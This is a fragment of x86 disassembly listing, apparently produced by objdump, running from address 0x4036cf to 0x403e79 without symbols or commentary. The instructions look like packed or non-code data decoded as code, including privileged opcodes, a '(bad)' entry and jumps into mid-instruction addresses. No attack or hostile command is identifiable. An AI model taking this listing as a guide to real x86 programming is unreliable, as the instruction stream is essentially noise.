  4036cf:	and    dh,BYTE PTR [edx+0x0]
  4036d2:	inc    eax
  4036d3:	and    DWORD PTR [ebx+eax*2+0x0],0x1b628951
  4036db:	popa   
  4036dc:	fisub  DWORD PTR [edx+ecx*2+0x8]
  4036e0:	sub    BYTE PTR [ecx+eax*1],0x5b
  4036e4:	pusha  
  4036e5:	add    BYTE PTR [ecx],0x24
  4036e8:	add    ebx,DWORD PTR [eax]
  4036ea:	or     cl,BYTE PTR ds:0xa1043a50
  4036f0:	inc    eax
  4036f1:	add    al,BYTE PTR [ebx]
  4036f3:	sub    BYTE PTR [eax],cl
  4036f5:	or     cl,BYTE PTR [eax+0xa1c0000]
  4036fb:	pop    es
  4036fc:	nop
  4036fd:	imul   esp,DWORD PTR [edx+0x1],0x7a8a00d0
  403704:	mov    al,0x3
  403706:	mov    al,ds:0x440d062
  40370b:	add    BYTE PTR [eax-0x70],cl
  40370e:	dec    eax
  40370f:	adc    BYTE PTR [ecx-0x7d877ffe],ah
  403715:	jb     0x40372f
  403717:	or     DWORD PTR [ebx],edx
  403719:	mov    al,0x0
  40371b:	and    eax,0xa0100004
  403720:	test   BYTE PTR [edx],cl
  403722:	sub    BYTE PTR [esi],cl
  403724:	and    al,0x19
  403726:	push   edx
  403727:	push   eax
  403728:	call   DWORD PTR ds:0x414db4
  40372e:	jl     0x4036f4
  403730:	sub    al,0x40
  403732:	or     al,0x21
  403734:	or     DWORD PTR ds:0x11a40011,eax
  40373a:	rol    BYTE PTR [eax],0x61
  40373d:	push   ecx
  40373e:	rol    DWORD PTR [ecx+0x1124400a],cl
  403744:	push   0x2180a0a
  403749:	jle    0x40374f
  40374b:	ror    BYTE PTR [eax+0xc],1
  40374e:	push   esp
  40374f:	mov    cl,0x83
  403751:	add    al,al
  403753:	sub    BYTE PTR [edx+0x60054004],al
  403759:	add    ah,BYTE PTR [eax]
  40375b:	or     al,0x11
  40375d:	inc    eax
  40375e:	and    BYTE PTR [eax],ah
  403760:	add    eax,0x48202010
  403765:	test   BYTE PTR [eax+0x20],dl
  403768:	ret    
  403769:	sbb    al,0x40
  40376b:	add    BYTE PTR [eax],0x0
  40376e:	inc    edx
  40376f:	sub    BYTE PTR [ebx+0x54123140],al
  403775:	add    ah,BYTE PTR [ebx]
  403777:	adc    DWORD PTR [eax+0x304142],ecx
  40377d:	sub    bl,BYTE PTR ds:0xb00187d0
  403783:	add    BYTE PTR [eax+eax*4],ah
  403786:	imul   edx,DWORD PTR [eax+0x170c8000],0x48000600
  403790:	sub    eax,0x4184e448
  403795:	add    al,BYTE PTR [eax+0x1402410]
  40379b:	add    BYTE PTR [edx],al
  40379d:	and    BYTE PTR [eax],ah
  40379f:	or     DWORD PTR [eax+0x20448810],0x54915270
  4037a9:	add    BYTE PTR [esp+eax*1],0xb2
  4037ad:	ins    BYTE PTR es:[edi],dx
  4037ae:	push   es
  4037af:	or     al,0x0
  4037b1:	add    al,0x21
  4037b3:	lods   eax,DWORD PTR ds:[esi]
  4037b4:	int3   
  4037b5:	dec    esp
  4037b6:	inc    ecx
  4037b7:	add    DWORD PTR [eax+edx*4],eax
  4037ba:	or     BYTE PTR [eax+0x23209240],ch
  4037c0:	sub    BYTE PTR [eax+0x882302a],cl
  4037c6:	push   es
  4037c7:	or     BYTE PTR [eax-0x78fcf6af],ah
  4037cd:	sbb    BYTE PTR [edx+0x3],0x42
  4037d1:	add    DWORD PTR [edx+0x7],edx
  4037d4:	add    BYTE PTR [eax],dl
  4037d6:	and    al,0x43
  4037d8:	mov    WORD PTR [ecx],ds
  4037da:	pop    eax
  4037db:	add    DWORD PTR [eax+0x6],esi
  4037de:	add    BYTE PTR [eax],dl
  4037e0:	add    BYTE PTR [ecx+0x2801082],ah
  4037e6:	add    BYTE PTR [eax+0x26],al
  4037e9:	dec    eax
  4037ea:	mov    dl,BYTE PTR [esp+ebx*2+0x48]
  4037ee:	or     BYTE PTR [eax+esi*8],dl
  4037f1:	lea    eax,[eax+0x40414800]
  4037f7:	dec    ebx
  4037f8:	inc    eax
  4037f9:	mov    eax,ds:0x3472040
  4037fe:	xor    al,BYTE PTR [esi+0x1822840]
  403804:	dec    ecx
  403805:	add    DWORD PTR [ecx],edx
  403807:	or     DWORD PTR [ecx-0x5e],ecx
  40380a:	sub    dl,BYTE PTR ds:0xa2009021
  403810:	add    ah,BYTE PTR [edx]
  403812:	fs add al,0x0
  403815:	mov    al,0xc
  403817:	add    DWORD PTR [eax],eax
  403819:	adc    BYTE PTR ds:0x4e9a8000,cl
  40381f:	dec    eax
  403820:	or     al,0x90
  403822:	add    cl,al
  403824:	rol    DWORD PTR [eax+0x8a33070],0x1
  40382b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40382c:	enter  0x1140,0xa
  403830:	add    BYTE PTR [eax+eax*1],dl
  403833:	adc    al,BYTE PTR [ecx-0x5e67eeff]
  403839:	push   cs
  40383a:	sbb    al,ah
  40383c:	and    BYTE PTR [edx-0x71fb1f6e],cl
  403842:	sub    DWORD PTR [edx+0x621b0620],0xffffff81
  403849:	inc    eax
  40384a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40384b:	mov    ah,BYTE PTR [eax]
  40384d:	or     al,BYTE PTR [edx]
  40384f:	dec    eax
  403850:	add    BYTE PTR [ecx],cl
  403852:	adc    cl,BYTE PTR [ecx+0xe]
  403855:	add    BYTE PTR [esi],ah
  403857:	dec    eax
  403858:	add    dl,BYTE PTR [edx+0x47000cf0]
  40385e:	and    dl,BYTE PTR [edx-0x7f6fd1f8]
  403864:	arpl   WORD PTR [edx],ax
  403866:	mov    eax,ds:0x12500281
  40386b:	sbb    DWORD PTR [eax],eax
  40386d:	xchg   ebx,eax
  40386e:	pop    eax
  40386f:	add    ch,BYTE PTR [eax]
  403871:	and    BYTE PTR [eax-0x5a],cl
  403874:	test   BYTE PTR [eax],cl
  403876:	or     BYTE PTR [eax],cl
  403878:	icebp  
  403879:	add    al,BYTE PTR [eax+0x50]
  40387c:	add    ecx,DWORD PTR [eax+0x22]
  40387f:	adc    DWORD PTR [eax],eax
  403881:	add    DWORD PTR [eax],edx
  403883:	xadd   DWORD PTR [ecx+0x2],ecx
  403887:	iret   
  403888:	pop    edx
  403889:	nop
  40388a:	adc    BYTE PTR [eax+ecx*2],dl
  40388d:	nop
  40388e:	call   0x1807:0x182410c0
  403895:	and    al,0x40
  403897:	sub    cl,BYTE PTR [eax]
  403899:	add    BYTE PTR [ecx],cl
  40389b:	and    BYTE PTR [eax],ch
  40389d:	add    BYTE PTR [eax+0x20094828],dl
  4038a3:	add    BYTE PTR [eax],cl
  4038a5:	or     dl,BYTE PTR [edx]
  4038a7:	sbb    al,0x9b
  4038a9:	cmp    DWORD PTR [eax],eax
  4038ab:	dec    ebx
  4038ac:	add    esp,esi
  4038ae:	or     BYTE PTR [eax+eax*1+0x2],dl
  4038b2:	inc    edx
  4038b3:	add    DWORD PTR [eax+0x10],eax
  4038b6:	inc    eax
  4038b7:	add    eax,DWORD PTR [ecx]
  4038b9:	pop    es
  4038ba:	xchg   esp,eax
  4038bb:	inc    eax
  4038bc:	and    dl,BYTE PTR [edi]
  4038be:	adc    BYTE PTR [edx],al
  4038c0:	dec    esi
  4038c1:	xchg   BYTE PTR [edx],ah
  4038c3:	and    DWORD PTR [eax],eax
  4038c5:	or     al,0x20
  4038c7:	push   ss
  4038c8:	add    BYTE PTR [eax+0x4020605],0x8a
  4038cf:	push   esp
  4038d0:	xlat   BYTE PTR ds:[ebx]
  4038d1:	fld    DWORD PTR [edi]
  4038d3:	sub    BYTE PTR [eax+eax*1],al
  4038d6:	and    BYTE PTR [edx],cl
  4038d8:	adc    BYTE PTR [eax],ah
  4038da:	dec    eax
  4038db:	inc    ebp
  4038dc:	add    ecx,DWORD PTR [eax]
  4038de:	sub    edx,DWORD PTR [eax]
  4038e0:	rol    DWORD PTR [ebp-0x7bfffcbc],cl
  4038e6:	adc    BYTE PTR [eax-0x7a],ah
  4038e9:	and    dl,BYTE PTR [ecx+0x11c52de4]
  4038ef:	push   ss
  4038f0:	and    BYTE PTR [eax],al
  4038f2:	add    eax,edx
  4038f4:	inc    eax
  4038f5:	adc    BYTE PTR [eax+0x45009600],0x40
  4038fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038fd:	cwde   
  4038fe:	xchg   edi,eax
  4038ff:	add    bl,BYTE PTR [edx+0x140100]
  403905:	and    BYTE PTR [edx+0x12],ah
  403908:	cwde   
  403909:	add    al,0x10
  40390b:	push   0x70626100
  403910:	inc    eax
  403911:	add    BYTE PTR [edx+0x30],0x9
  403915:	add    BYTE PTR [edx],dl
  403917:	cmp    ecx,DWORD PTR [ecx+eax*4+0xc8018c0]
  40391e:	or     DWORD PTR [edx],esi
  403920:	adc    al,0xa
  403922:	aad    0x20
  403924:	inc    ecx
  403925:	and    BYTE PTR [esi],dl
  403927:	add    BYTE PTR [eax+0x190600],al
  40392d:	pop    edx
  40392e:	shl    DWORD PTR [eax+0x14],0x41
  403932:	and    dl,BYTE PTR [edx+0x14a22d]
  403938:	nop
  403939:	adc    eax,0x42200c8
  40393e:	add    al,BYTE PTR [ecx]
  403940:	add    dl,BYTE PTR [ebx+0x52]
  403943:	adc    al,0x20
  403945:	adc    DWORD PTR [eax+0x11603905],esp
  40394b:	ret    0x8460
  40394e:	test   BYTE PTR [eax+eax*4],al
  403951:	add    BYTE PTR [eax],dl
  403953:	inc    edx
  403954:	add    al,BYTE PTR [eax+eax*1]
  403957:	add    ah,BYTE PTR [ecx-0x78febbf4]
  40395d:	jne    0x4039b1
  40395f:	adc    al,0x83
  403961:	dec    esp
  403962:	and    BYTE PTR [eax],al
  403964:	xor    BYTE PTR [edx],al
  403966:	inc    eax
  403967:	inc    eax
  403968:	add    cl,BYTE PTR [eax]
  40396a:	mov    BYTE PTR [eax],al
  40396c:	les    ebx,FWORD PTR [eax+0x401c1020]
  403972:	rol    BYTE PTR [edx],0x14
  403975:	and    DWORD PTR [esp+ecx*4],eax
  403978:	inc    esp
  403979:	arpl   WORD PTR [eax],si
  40397b:	ret    0x400f
  40397e:	and    edx,DWORD PTR [ecx]
  403980:	and    BYTE PTR [eax],al
  403982:	adc    DWORD PTR [edx+0x54],0x48c00860
  403989:	add    edx,DWORD PTR [eax+0x401000]
  40398f:	adc    DWORD PTR [ecx-0x27bdbef8],eax
  403995:	and    BYTE PTR [ecx],bl
  403997:	push   ds
  403998:	arpl   WORD PTR [edx+eax*1],dx
  40399b:	rol    BYTE PTR [edx+0x2b],1
  40399e:	push   es
  40399f:	mov    WORD PTR [eax],es
  4039a1:	adc    BYTE PTR [esi+0x4018832],0x62
  4039a8:	int3   
  4039a9:	adc    al,BYTE PTR [edx]
  4039ab:	nop
  4039ac:	and    al,BYTE PTR [eax+0x1204010c]
  4039b2:	and    DWORD PTR [edx+0x30],eax
  4039b5:	add    BYTE PTR [ebx],ah
  4039b7:	ret    0x4291
  4039ba:	and    DWORD PTR [ecx],edx
  4039bc:	push   eax
  4039bd:	sbb    BYTE PTR [ebx-0x5e9aeeef],cl
  4039c3:	or     esi,DWORD PTR es:[eax]
  4039c6:	inc    eax
  4039c7:	adc    BYTE PTR [eax],al
  4039c9:	loop   0x4039b1
  4039cb:	add    eax,DWORD PTR ds:0x41811310
  4039d1:	or     bh,BYTE PTR [edx-0x7fdd6ff8]
  4039d7:	and    DWORD PTR [ebx],0x2420a081
  4039dd:	xor    DWORD PTR [eax],0x26
  4039e0:	adc    al,0x6a
  4039e2:	inc    eax
  4039e3:	and    ebx,DWORD PTR [esp+edx*1]
  4039e6:	dec    eax
  4039e7:	and    DWORD PTR [eax+0x0],ecx
  4039ea:	or     BYTE PTR [eax+edx*4],dl
  4039ed:	or     ah,0x30
  4039f0:	nop
  4039f1:	sub    al,0x48
  4039f3:	sub    DWORD PTR [esp+edx*2],eax
  4039f6:	adc    ah,BYTE PTR [eax+0x18]
  4039f9:	xchg   ecx,eax
  4039fa:	stos   BYTE PTR es:[edi],al
  4039fb:	in     al,0x0
  4039fd:	xor    ah,BYTE PTR [edx+0x52]
  403a00:	sbb    BYTE PTR [eax-0x3f],ch
  403a03:	inc    eax
  403a04:	mov    BYTE PTR [eax+0x40],al
  403a07:	add    al,0xaa
  403a09:	or     BYTE PTR [edx],ah
  403a0b:	sub    BYTE PTR [ebp-0x7f],al
  403a0e:	ror    DWORD PTR [ebx+0x3],1
  403a11:	data16 mov BYTE PTR [edx],al
  403a14:	cwde   
  403a15:	add    BYTE PTR [ecx],ah
  403a17:	or     BYTE PTR [edx],0x48
  403a1a:	xchg   edx,eax
  403a1b:	sub    al,BYTE PTR [eax+eax*1+0xf068308]
  403a22:	mov    eax,0xc1810033
  403a27:	push   eax
  403a28:	pusha  
  403a29:	adc    BYTE PTR [ebx],al
  403a2b:	nop
  403a2c:	xchg   BYTE PTR [eax+0x24],cl
  403a2f:	sub    DWORD PTR [ecx],eax
  403a31:	or     ah,BYTE PTR [esp]
  403a34:	and    DWORD PTR [ecx],eax
  403a36:	and    ch,al
  403a38:	inc    ecx
  403a39:	rol    BYTE PTR [eax],0x89
  403a3c:	or     al,0x2
  403a3e:	add    al,0x42
  403a40:	mov    BYTE PTR [edx+ebx*1],al
  403a43:	xor    al,0xa
  403a45:	sbb    BYTE PTR [ebx+0x4081400],al
  403a4b:	and    al,0x35
  403a4d:	add    BYTE PTR [esi+0x30020a18],ah
  403a53:	sub    BYTE PTR [eax],al
  403a55:	nop
  403a56:	shl    BYTE PTR [edx-0x7f],0x88
  403a5a:	or     al,0x30
  403a5c:	ret    0xad0c
  403a5f:	sbb    DWORD PTR [eax-0x3af28000],esi
  403a65:	add    BYTE PTR [eax],al
  403a67:	add    edx,DWORD PTR [esi]
  403a69:	inc    ecx
  403a6a:	and    BYTE PTR [ecx-0x1dffebfa],al
  403a70:	add    DWORD PTR [eax+0x20],ebp
  403a73:	dec    edx
  403a74:	test   BYTE PTR [edx],bl
  403a76:	dec    eax
  403a77:	sbb    BYTE PTR [eax],al
  403a79:	jb     0x403a7c
  403a7b:	or     BYTE PTR ds:0x8800a031,0x28
  403a82:	inc    eax
  403a83:	push   ss
  403a84:	xor    al,0x11
  403a86:	and    dl,BYTE PTR [ecx+0x3ab8a003]
  403a8c:	inc    edx
  403a8d:	add    BYTE PTR [eax],cl
  403a8f:	add    BYTE PTR [eax+0x10],al
  403a92:	sbb    al,0x21
  403a94:	push   eax
  403a95:	adc    BYTE PTR [eax+eax*1+0x6c4e5060],bl
  403a9c:	add    BYTE PTR [eax],dl
  403a9e:	push   eax
  403a9f:	and    ecx,DWORD PTR [ecx+0xa638020]
  403aa5:	sub    DWORD PTR [edx-0x4d],0x3520822
  403aac:	and    ah,BYTE PTR [esi*4-0x3ffee70f]
  403ab3:	adc    dh,BYTE PTR [edx+0x28]
  403ab6:	dec    edi
  403ab7:	or     DWORD PTR [eax+0x4ad10180],eax
  403abd:	sbb    eax,DWORD PTR [eax+0x20]
  403ac0:	add    dl,BYTE PTR [edx]
  403ac2:	adc    BYTE PTR [eax-0x31effb50],dh
  403ac8:	lods   al,BYTE PTR ds:[esi]
  403ac9:	adc    BYTE PTR [eax],0x42
  403acc:	push   cs
  403acd:	nop
  403ace:	add    al,0x18
  403ad0:	inc    ebx
  403ad1:	inc    esp
  403ad2:	add    DWORD PTR [eax],ecx
  403ad4:	add    BYTE PTR ds:0x91812002,dl
  403ada:	test   BYTE PTR [eax+0x40],ah
  403add:	add    BYTE PTR [eax-0x40],dl
  403ae0:	adc    DWORD PTR [edx+0x1800a00a],0x10
  403ae7:	sub    BYTE PTR [eax+0x420120],al
  403aed:	and    DWORD PTR [ecx-0x351dff7a],ecx
  403af3:	inc    eax
  403af4:	add    BYTE PTR [eax],dl
  403af6:	mov    dl,BYTE PTR [eax]
  403af8:	or     al,0x21
  403afa:	add    BYTE PTR [eax],al
  403afc:	add    DWORD PTR [eax+eax*2],0x18c52448
  403b03:	cwde   
  403b04:	mov    BYTE PTR [ecx],al
  403b06:	and    eax,DWORD PTR [eax]
  403b08:	xor    BYTE PTR [ecx+0x61],bh
  403b0b:	or     BYTE PTR [esp+ebx*4],dl
  403b0e:	inc    edx
  403b0f:	inc    eax
  403b10:	sbb    DWORD PTR [eax],esi
  403b12:	popa   
  403b13:	add    BYTE PTR [edx+0x5],al
  403b16:	push   eax
  403b17:	inc    ebx
  403b18:	or     BYTE PTR [eax],cl
  403b1a:	sub    DWORD PTR [eax],esp
  403b1c:	add    ecx,DWORD PTR [eax]
  403b1e:	mov    BYTE PTR [ebx],ah
  403b20:	add    dh,ch
  403b22:	ja     0x403b24
  403b24:	add    BYTE PTR [edi+edx*1],ah
  403b27:	push   eax
  403b28:	mov    al,ds:0x21314198
  403b2d:	add    DWORD PTR [eax+0x2],0x58002
  403b34:	and    BYTE PTR [eax],0x40
  403b37:	inc    eax
  403b38:	nop
  403b39:	add    DWORD PTR [edx+0xa00080c],0x1001515
  403b43:	js     0x403b48
  403b45:	or     BYTE PTR [ecx],al
  403b47:	sbb    al,0x20
  403b49:	and    dl,BYTE PTR [eax]
  403b4b:	add    al,0x20
  403b4d:	and    DWORD PTR [ecx+0xa01a024],eax
  403b53:	dec    eax
  403b54:	and    BYTE PTR [ebx-0x40],al
  403b57:	add    al,BYTE PTR [edx]
  403b59:	add    al,BYTE PTR [eax]
  403b5b:	inc    edx
  403b5c:	xor    BYTE PTR [ebx],dl
  403b5e:	test   BYTE PTR [eax],cl
  403b60:	or     BYTE PTR [eax+0x23a00a09],al
  403b66:	add    BYTE PTR [ecx+0x41],al
  403b69:	ret    
  403b6a:	adc    BYTE PTR [eax],ah
  403b6c:	add    DWORD PTR [ebp+0x50],eax
  403b6f:	mov    ah,0x81
  403b71:	test   al,bl
  403b73:	add    BYTE PTR [edx+eiz*1],dl
  403b76:	add    BYTE PTR gs:[eax],0x64
  403b7a:	dec    ebp
  403b7b:	inc    ecx
  403b7c:	test   al,0x40
  403b7e:	rol    BYTE PTR [ecx],0x48
  403b81:	test   BYTE PTR [eax+edx*4],bh
  403b84:	push   ebp
  403b85:	or     ch,BYTE PTR [edi+eax*1-0x5ff48fa0]
  403b8c:	add    DWORD PTR ds:0x405754c4,eax
  403b92:	add    BYTE PTR [eax+eiz*4+0x200d289],ah
  403b99:	add    BYTE PTR [esi+ecx*1+0x12008444],ah
  403ba0:	add    eax,0x90920c00
  403ba5:	inc    eax
  403ba6:	and    BYTE PTR [eax],al
  403ba8:	add    DWORD PTR [eax],eax
  403baa:	inc    edx
  403bab:	sub    eax,0x1859411
  403bb0:	add    al,0xc2
  403bb2:	and    BYTE PTR [eax*1+0x112226d0],al
  403bb9:	or     eax,DWORD PTR [ecx+0x2e60240]
  403bbf:	and    BYTE PTR [ebx],al
  403bc1:	sub    DWORD PTR [edx],eax
  403bc3:	add    edx,DWORD PTR [eax+0x2f]
  403bc6:	xchg   BYTE PTR [eax+ecx*1+0x1d04],ch
  403bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bce:	or     BYTE PTR [ecx],0x11
  403bd1:	add    BYTE PTR [eax+0x40],bl
  403bd4:	and    BYTE PTR [esi],ch
  403bd6:	inc    ecx
  403bd7:	dec    ebx
  403bd8:	and    ebx,eax
  403bda:	add    BYTE PTR [edi+eiz*1],bl
  403bdd:	adc    BYTE PTR [ecx],al
  403bdf:	les    esp,FWORD PTR [ebx-0x7e]
  403be2:	cmp    cl,BYTE PTR [ebp+0x832a924]
  403be8:	add    BYTE PTR [eax],dh
  403bea:	push   0xffffffc2
  403bec:	and    BYTE PTR [eax],al
  403bee:	push   es
  403bef:	adc    BYTE PTR [edx+eax*2],dl
  403bf2:	add    BYTE PTR ds:0x12002210,ch
  403bf8:	adc    BYTE PTR [eax],cl
  403bfa:	jo     0x403b8d
  403bfc:	adc    BYTE PTR [eax-0x40],al
  403bff:	mov    es,WORD PTR [ebx+0x5]
  403c02:	push   es
  403c03:	inc    esp
  403c04:	add    DWORD PTR [ecx],0x406b00a0
  403c0a:	rcl    DWORD PTR [eax],0x41
  403c0d:	add    ebx,DWORD PTR [ecx]
  403c0f:	or     BYTE PTR [eax],al
  403c11:	add    BYTE PTR [eax+0x0],al
  403c14:	mov    al,ds:0x7e58042c
  403c19:	xor    BYTE PTR [ebx-0x78],cl
  403c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c1d:	xchg   BYTE PTR [ecx],cl
  403c1f:	mov    al,ds:0x403000c0
  403c24:	add    DWORD PTR [eax],eax
  403c26:	inc    esp
  403c27:	xor    BYTE PTR [eax+eax*1+0x14414281],cl
  403c2e:	adc    al,BYTE PTR [eax]
  403c30:	adc    eax,eax
  403c32:	xor    DWORD PTR [ebx],esp
  403c34:	push   es
  403c35:	or     al,0xa0
  403c37:	xor    BYTE PTR [eax+eax*8+0x49],0xa2
  403c3c:	and    esp,DWORD PTR [ecx+0x2621c020]
  403c42:	or     al,0x40
  403c44:	retf   0x310
  403c47:	or     al,0x1
  403c49:	add    BYTE PTR [edi],cl
  403c4b:	add    BYTE PTR [eax],al
  403c4d:	push   esi
  403c4e:	cmp    BYTE PTR [eax],al
  403c50:	ins    BYTE PTR es:[edi],dx
  403c51:	and    DWORD PTR [eax],eax
  403c53:	mov    al,ds:0x74188c81
  403c58:	add    DWORD PTR [ecx],esp
  403c5a:	nop
  403c5b:	jnp    0x403ca1
  403c5d:	add    cl,BYTE PTR [edx]
  403c5f:	add    BYTE PTR [eax],0xa0
  403c62:	sub    BYTE PTR [ecx+0xb],ah
  403c65:	inc    edx
  403c66:	inc    eax
  403c67:	or     BYTE PTR [eax],cl
  403c69:	in     al,0x32
  403c6b:	sub    BYTE PTR [edx+0x4924461],al
  403c71:	add    BYTE PTR [esp+edx*2+0x18132815],ah
  403c78:	xor    al,0x22
  403c7a:	ja     0x403c8e
  403c7c:	rol    BYTE PTR [ebp+0x40],0x5
  403c80:	xor    al,BYTE PTR [edx+ebx*1+0x1d864490]
  403c87:	add    BYTE PTR [edx+eax*1],al
  403c8a:	shl    BYTE PTR [edx],0x80
  403c8d:	popa   
  403c8e:	add    BYTE PTR [ecx],al
  403c90:	popa   
  403c91:	push   es
  403c92:	add    al,0x26
  403c94:	or     BYTE PTR [edx+0xa],ah
  403c97:	add    al,0x10
  403c99:	add    DWORD PTR [eax],0x2202158c
  403c9f:	add    DWORD PTR [ecx+ecx*4],esp
  403ca2:	arpl   WORD PTR [ecx],sp
  403ca4:	add    BYTE PTR [edx],dl
  403ca6:	rol    BYTE PTR [eax],0x20
  403ca9:	add    BYTE PTR [eax+eax*1],dh
  403cac:	add    BYTE PTR [eax],dl
  403cae:	stos   BYTE PTR es:[edi],al
  403caf:	pop    edx
  403cb0:	add    DWORD PTR [ecx],ebp
  403cb2:	or     ah,ah
  403cb4:	lar    edx,WORD PTR [esi+0x30011814]
  403cbb:	dec    eax
  403cbc:	add    al,BYTE PTR [eax]
  403cbe:	inc    eax
  403cbf:	mov    edx,cr0
  403cc2:	dec    eax
  403cc3:	add    cl,BYTE PTR [eax]
  403cc5:	test   BYTE PTR [ecx+ecx*8+0x19],al
  403cc9:	jo     0x403ceb
  403ccb:	mov    al,ds:0x21180600
  403cd0:	add    BYTE PTR [ebp+0x403bc022],0x22
  403cd7:	adc    DWORD PTR [eax-0x7c],edx
  403cda:	add    al,0x10
  403cdc:	inc    esp
  403cdd:	xor    al,0x44
  403cdf:	xor    esp,ecx
  403ce1:	inc    eax
  403ce2:	add    al,ah
  403ce4:	or     eax,DWORD PTR [edx]
  403ce6:	xor    BYTE PTR [ebx-0x60],0x2
  403cea:	retf   
  403ceb:	add    ah,BYTE PTR [eax]
  403ced:	test   DWORD PTR [ecx],ecx
  403cef:	sbb    BYTE PTR [eax+0x5b],cl
  403cf2:	and    DWORD PTR [ecx+0x12882422],edx
  403cf8:	add    DWORD PTR [eax],ecx
  403cfa:	add    eax,0x10a00029
  403cff:	sub    BYTE PTR [eax+0x18],al
  403d02:	add    BYTE PTR [eax-0x30],ah
  403d05:	push   eax
  403d06:	inc    edx
  403d07:	add    BYTE PTR [edx+0x2417100d],al
  403d0d:	add    al,0x83
  403d0f:	pop    ebp
  403d10:	mov    BYTE PTR [ebx],cl
  403d12:	or     BYTE PTR [eax+eax*2+0x24],ch
  403d16:	add    al,0xc1
  403d18:	sbb    dl,bh
  403d1a:	ret    0x5009
  403d1d:	sub    cl,bl
  403d1f:	or     BYTE PTR [eax],ah
  403d21:	add    DWORD PTR [eax],ecx
  403d23:	or     BYTE PTR [ecx-0x6f],bh
  403d26:	and    DWORD PTR [edx+eiz*2],0x1520008
  403d2d:	push   ds
  403d2e:	add    BYTE PTR [eax+edx*1],dh
  403d31:	add    BYTE PTR [edx],dl
  403d33:	push   eax
  403d34:	inc    ecx
  403d35:	add    BYTE PTR [eax+0x8],bl
  403d38:	add    DWORD PTR ds:0x10028080,0x30
  403d3f:	inc    edx
  403d40:	add    dh,BYTE PTR [eax+0x8124316]
  403d46:	or     ch,0x4a
  403d49:	inc    eax
  403d4a:	and    esp,DWORD PTR [ecx-0x7f7c6d74]
  403d50:	and    BYTE PTR [eax-0x77fdbf2f],dl
  403d56:	rol    BYTE PTR [eax+0x2144400],0xc1
  403d5d:	add    DWORD PTR [edx-0x80],ecx
  403d60:	or     BYTE PTR [eax+esi*4],al
  403d63:	adc    DWORD PTR [ecx],eax
  403d65:	pop    ecx
  403d66:	adc    esp,DWORD PTR [eax+0x242105a8]
  403d6c:	push   es
  403d6d:	inc    ecx
  403d6e:	inc    edx
  403d6f:	inc    edx
  403d70:	push   esp
  403d71:	push   0x9020803c
  403d76:	pop    es
  403d77:	rol    DWORD PTR [edx+edx*1],0x0
  403d7b:	or     BYTE PTR [eax],cl
  403d7d:	or     BYTE PTR [ecx],al
  403d7f:	add    al,0x50
  403d81:	inc    edx
  403d82:	add    cl,BYTE PTR [eax-0x59]
  403d85:	add    BYTE PTR [edx+0x2352120],al
  403d8b:	inc    ebp
  403d8c:	jo     0x403d4e
  403d8e:	add    BYTE PTR [eax],dl
  403d90:	add    BYTE PTR [eax-0x5e],cl
  403d93:	add    BYTE PTR [edx+0x60815232],al
  403d99:	push   ss
  403d9a:	xchg   ecx,eax
  403d9b:	add    al,0x80
  403d9d:	or     eax,0x1d8040a0
  403da2:	push   0x0
  403da4:	or     al,0x48
  403da6:	mov    eax,ds:0xb302532
  403dab:	add    BYTE PTR [eax],al
  403dad:	adc    BYTE PTR [ebp+0x2968220],cl
  403db3:	and    eax,0x54859201
  403db8:	pusha  
  403db9:	add    BYTE PTR [eax+0x0],0x40
  403dbd:	rol    BYTE PTR [ecx+0x1015200],0x4
  403dc4:	add    al,BYTE PTR [eax+0x41]
  403dc7:	and    al,BYTE PTR ds:0x100b
  403dcd:	dec    ecx
  403dce:	adc    BYTE PTR [eax],dh
  403dd0:	nop
  403dd1:	add    BYTE PTR [eax],al
  403dd3:	popa   
  403dd4:	inc    eax
  403dd5:	push   esp
  403dd6:	mov    BYTE PTR [eax],al
  403dd8:	add    BYTE PTR [ebx],al
  403dda:	and    dl,BYTE PTR [eax+edx*1]
  403ddd:	call   0x115840a5
  403de2:	or     BYTE PTR [ebx-0x5b],al
  403de5:	sub    BYTE PTR [eax+0x12500062],al
  403deb:	add    BYTE PTR [eax+eiz*4],ah
  403dee:	and    BYTE PTR fs:[ecx],dl
  403df1:	pop    es
  403df2:	add    ah,BYTE PTR [ecx+0x41]
  403df5:	enter  0x120,0x86
  403df9:	xor    BYTE PTR [eax+0x10],dl
  403dfc:	pop    es
  403dfd:	pusha  
  403dfe:	add    BYTE PTR [ecx-0x5c],al
  403e01:	inc    eax
  403e02:	pop    es
  403e03:	test   BYTE PTR [ecx],al
  403e05:	add    al,al
  403e07:	add    ch,BYTE PTR [eax+0x8]
  403e0a:	dec    eax
  403e0b:	sbb    al,BYTE PTR [eax]
  403e0d:	mov    ds:0x40509200,al
  403e13:	mov    BYTE PTR [eax+eiz*1],ch
  403e16:	rol    BYTE PTR ds:0x84010e82,0x30
  403e1d:	push   ss
  403e1e:	add    BYTE PTR [eax+eiz*4],al
  403e21:	test   BYTE PTR [ebx+0x40504300],al
  403e27:	add    ebx,DWORD PTR [eax]
  403e29:	add    esp,DWORD PTR [ecx]
  403e2b:	pusha  
  403e2c:	(bad)  
  403e2d:	rol    DWORD PTR [ebx+0x10022290],1
  403e33:	xor    DWORD PTR [eax+0x254d0282],esi
  403e39:	dec    eax
  403e3a:	add    BYTE PTR [esi],ah
  403e3c:	add    ch,dl
  403e3e:	or     dh,BYTE PTR [edx]
  403e40:	xor    al,0x88
  403e42:	and    al,0x0
  403e44:	or     BYTE PTR [edx],al
  403e46:	adc    DWORD PTR [ebx],eax
  403e48:	add    bl,BYTE PTR [eax+eiz*4]
  403e4b:	push   eax
  403e4c:	mov    DWORD PTR [eax],eax
  403e4e:	add    BYTE PTR [ecx],0x30
  403e51:	sbb    BYTE PTR [ecx+0x8185110],bl
  403e57:	bound  eax,QWORD PTR [esi]
  403e59:	xor    BYTE PTR [eax],al
  403e5b:	push   edi
  403e5c:	dec    ecx
  403e5d:	or     BYTE PTR [eax],dl
  403e5f:	xchg   ecx,eax
  403e60:	or     al,0x3
  403e62:	dec    eax
  403e63:	add    BYTE PTR [edx],al
  403e65:	bound  eax,QWORD PTR [esi]
  403e67:	rol    BYTE PTR [ecx+0x2],cl
  403e6a:	or     BYTE PTR [ecx],al
  403e6c:	or     BYTE PTR [ecx],0x0
  403e6f:	add    eax,DWORD PTR [edx+0x28003049]
  403e75:	sbb    dl,BYTE PTR [ecx]
  403e77:	add    al,0xb8
  403e79:	test   BYTE PTR [eax],dl
